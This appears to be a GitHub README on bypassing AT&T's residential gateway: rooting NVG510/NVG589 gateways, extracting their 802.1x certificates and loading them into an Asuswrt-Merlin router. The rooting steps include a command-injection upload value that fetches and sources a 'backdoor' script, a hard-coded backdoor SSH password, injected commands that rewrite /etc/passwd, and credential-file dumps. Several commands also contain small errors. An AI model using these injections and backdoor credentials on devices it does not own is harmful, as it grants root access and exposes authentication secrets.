# BypassAttRG
Using Asuswrt-Merlin to bypass AT&amp;T's residential gateway. (rt-ac68u <--> ~BGW210~ <--> ONT)  
This method only requires Asuswrt-Merlin. No *pfSense*, or *netgraph*  or dumb switch needed.  
I only tested with rt-ac68u, but the method should work for all Asuswrt-Merlin based wireless routers (Please let me know if it doesn't).  
Now, the home router connects optical network terminal(ONT) directly. You should setup the firewall wisely.

<!-- **Background**: I switch to AT&T fiber and I hate AT&T residential gateway -->


## Menu
- [Prerequisites](#prerequisites)
- [Extract Certificates](#extract-certificates)
- [Configuring 802.1x authentication](#configuring-8021x-authentication)
- [Miscellaneous](#miscellaneous)
- [Credits & References](#credits--references)

  
## Prerequisites
- [Python 3](https://www.python.org/downloads/release/python-373/) for the local http server. There are many alternatives.
- Basic knowledge of POSIX commands (cd, mkdir, wget, etc.).
- A NVG510 or NVG589

[Back to menu](#menu)
## Extract Certificates
The certificates extracted from both NVG510 and NVG589 work, however NVG510 costs less and is easier to root.
- [NVG510](#nvg510)
- [NVG589](#nvg589) (maybe NVG599)
### NVG510
#### Rooting
Credit: [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui)
- Downgrade firmware to [9.0.6h2d30](firmware/nvg510/nbxv9.0.6h2d30.bin)
- Follow this guide [Rooting The NVG510 from the WebUI](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui).  
If NVG510 has no connection to internet, you may want to setup a local server for NVG510 to download the script.
   Download [http://earlz.net/static/backdoor.nvg510.sh](http://earlz.net/static/backdoor.nvg510.sh)
  - Using Python to setup a simple http server. `python -m http.server`
  - Change _uploadfile_ to `errrr && wget http://YOUR_LOCAL_IP:8000/backdoor.nvg510.sh -O /tmp/backdoor.sh && source /tmp/backdoor.sh && errr`
<!-- - If it is successful, you should see something like this: -->
- Login `telnet 192.168.1.254 28`. The username is **admin** and the password is your modem's *access code*.
- Type `!`. It switches to root shell.

#### Extract Certificates
- Download [busybox-mips](https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mips) to your **local** device. 
- Start Python http server. `python -m http.server`
- In NVG510, `wget https://YOUR_LOCAL_IP:8000/busybox-mips -O /tmp/busybox`
- `chmod +x /tmp/busybox`
- `/tmp/busybox dd if=/dev/mtdblock4 of=/tmp/mfg.dat bs=1k`
- `mkdir /tmp/images` 
- `mount -o blind /tmp/images /www/att/imges`
- `cp /tmp/mfg.dat /www/att/images`
- `cd /tmp`
- `tar cf cert.tar /etc/rootcert/`
- `cp cert.tar /www/att/images`
-  Download http://192.168.1.254/images/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.
   
### NVG589 
#### Rooting
Credit: [nomotion](https://www.nomotion.net/blog/sharknatto/)
- If your firmware version <= *9.1.0h12d15_1.1*, the following method may work for you. (**I didn't test this method.**)  
  [A complete bricking guide for Motorola/Arris NVG589.](https://github.com/MakiseKurisu/NVG589/wiki)
- Otherwise, downgrade(upgrade) to [9.2.2h0d83](firmware/nvg589/spnvg589-9.2.2h0d83.bin).
- Reset NVG589 and `ssh remotessh@192.168.1.254` (password:`5SaP9I26`)
  - **If ssh is not enabled** at this time, upgrade to [9.2.2h4d16](firmware/nvg589/spnvg589-9.2.2h4d16.bin) with **ONT interface connected to AT&T's ONT**.
  - Wait a bit, AT&T may start upgrade your NVG589's firmware. 
	- At the time of this writing, it upgraded to [9.2.2h11d22](firmware/nvg589/spnvg589-9.2.2h11d22.bin).
	- If not, manually upgrade to [9.2.2h11d22](firmware/nvg589/spnvg589-9.2.2h11d22.bin).
  - When you see it is upgrading (power LED turns amber, and other LEDs are off), disconnect **ONT cable**.
  - Downgrade back to [9.2.2h0d83](firmware/nvg589/spnvg589-9.2.2h0d83.bin).
  - Now ssh should be enabled. **Please let me know if you find an easier and simpler method**.
- In NVG589, run the following commands in order. (Credit: [samlii@dslreports](https://www.dslreports.com/forum/r32375916-))
  ```
  ping -c 1 192.168.1.254;echo /bin/nsh >>/etc/shells
  ping -c 1 192.168.1.254;echo /bin/sh >>/etc/shells
  ping -c 1 192.168.1.254;sed -i 's/cshell/nsh/g' /etc/passwd
  ```
- Exit `exit` and shh back `ssh remotessh@192.168.1.254` (password:`5SaP9I26`)
- Type `!`. It switches to root shell.

#### Extract Certificates
- In NVG589, run the following commands in order. Make sure you are in root shell.
  ```
  mount mtd:mfg -t jffs2 /mfg && cp /mfg/mfg.dat /tmp/ && umount /mfg
  cd /tmp
  tar cf cert.tar /etc/rootcert/
  cp cert.tar /www/att/images
  cp /tmp/mfg.dat /www/att/images
  ```
- Download http://192.168.1.254/images/mfg.dat and http://192.168.1.254/images/cert.tar to your **local** device.


[Back to menu](#menu)
## Configuring 802.1x authentication
### Decode Credentials 
Credit: [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)
<!-- - Follow this guide: [EAP-TLS credentials decoder for Motorola and Arris gateways. Ultimate fiber router bypass!](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html) -->
  <!-- - Basically, unzip *cert.tar*  -->
- Download decoder v1.0.4: [win](decoder/win/mfg_dat_decode_1_04.zip), [linux](decoder/linux/mfg_dat_decode_1_04.tar.gz), [mac](decoder/mac/mfg_dat_decode_1_04_macosx.zip)
  - [Original download page](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html)
- Copy *mfg.dat*, unzip *cert.tar* to the same location as *mfg_dat_decode*.
- Run *mfg_dat_decode*. You should get a file like this: *EAP-TLS_8021x_XXXX*.

### Update wpa_supplicant in Asuswrt-Merlin

I cannot use the build-in wpa\_supplicant v0.6 in Asuswrt-Merlin to achieve my goal, so I compiled the wpa\_supplicant v2.7 from [Entware repository](https://github.com/Entware/Entware). Here I provide the necessary binary files. If you want to compile them by yourself which you should do, [check this](#compile-entware-packages-from-source).
<!-- - Download the [packages](packages.tar.gz) -->
- start python http server. `python -m http.server`
- ssh to your router. (You need to enable ssh in the web GUI.)
- Download the [packages](packages.tar.gz) and unzip it. `wget https://github.com/bypassrg/att/blob/master/packages.tar.gz && tar -xzf packages.tar.gz`
- Download *EAP-TLS_8021x_XXXX* file from your local http server. `wget https://YOUR_LOCAL_IP:8000/EAP-TLS_8021x_XXXX.tar.gz`
  - Unzip and copy files to */jffs/EAP*. `mkdir /jffs/EAP && tar xzf EAP-TLS_8021x_XXXX.tar.gz -C /jffs/EAP ` 
  - Modify *wpa_supplicant.conf*. Set *\*.pem* to the absolute path.
	```
	ca_cert="/jffs/EAP/CA_XXXX.pem"
	client_cert="/jffs/EAP/Client_XXXX.pem"
	private_key="/jffs/EAP/PrivateKey_PKCS1_XXXX.pem"
	```
- Install Entware in your router.
  - Install in the usb drive. [Entware](https://github.com/RMerl/asuswrt-merlin/wiki/Entware)
  - Install in jffs. Run this script: [entware_jffs.sh](https://github.com/bypassrg/att/blob/master/entware_jffs.sh)  
  `wget -O - https://github.com/bypassrg/att/blob/master/entware_jffs.sh |sh`
- Install wpa\_supplicant and dependencies.  
  <!-- `wget -O - https://github.com/bypassrg/att/blob/master/install_wpa.sh |sh` -->
  ```
  opkg update
  opkg install libubox
  echo -e "\ndest opt /opt" >> /opt/etc/opkg.conf
  opkg install -d opt libubus_2018-10-06-221ce7e7-1_armv7-2.6.ipk
  opkg install -d opt hostapd-common_2018-12-02-c2c6c01b-6_armv7-2.6.ipk
  opkg install -d opt wpa-supplicant_2018-12-02-c2c6c01b-6_armv7-2.6.ipk
  opkg install fake-hwclock
  echo -e "\n/opt/usr/sbin/wpa_supplicant -s -B -Dwired -ieth0 -c/jffs/EAP/wpa_supplicant.conf" >> /opt/etc/init.d/rc.unslung
  ```

### Configure Asuswrt-Merlin via web GUI
- In *WAN* tab, set *MAC Address* to *identity* value which you can find in *wpa_supplicant.conf*.
- Enable *AiProtection*.
  - I guess this sets VLAN tag to the network traffic, so we don't need *pfSense* or *netgraph*.
  
### Debug
- If it is the first time to use the certificates, it takes several rounds of authentication. Just wait.
- check */tmp/syslog.log* in the router.
- Manually start wpa_supplicant with debug option.  
`/opt/usr/sbin/wpa_supplicant -dd -Dwired -ieth0 -c/jffs/EAP/wpa_supplicant.conf`

## Miscellaneous

### Compile Entware packages from source
Some useful links
- [Compile-packages-from-sources](https://github.com/Entware/Entware/wiki/Compile-packages-from-sources)
- [Compile-custom-programs-from-source](https://github.com/RMerl/asuswrt-merlin/wiki/Compile-custom-programs-from-source)

### To-dos
- [ ] Cross compile *wpa_supplicant*, so we don't need to install *Entware*.
- [ ] Ask Merlin to update *wpa_supplicant*.
- [ ] Try to use Openwrt/ddwrt to bypass AT&T's RG.

		

[Back to menu](#menu)
## Credits & References
- [devicelocksmith](https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html): EAP-TLS credentials decoder and the method to extract */mfg/mfg.dat*
- [earlz](http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui): Rooting The NVG510 from the WebUI
- [nomotion](https://www.nomotion.net/blog/sharknatto/): NVG589 root exploit
- [dslreports.com](https://www.dslreports.com/forum/uverse): A great forum with many useful information.

[Back to menu](#menu)

